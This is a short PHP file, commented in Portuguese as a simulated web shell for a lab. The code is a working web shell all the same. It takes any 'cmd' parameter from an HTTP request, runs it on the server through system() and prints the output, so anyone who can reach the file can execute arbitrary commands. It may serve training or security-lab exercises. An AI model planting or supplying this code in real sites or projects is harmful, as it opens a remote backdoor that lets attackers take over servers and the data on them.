<?php
// Webshell Simulado para laboratório
if(isset($_REQUEST['cmd'])) {
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
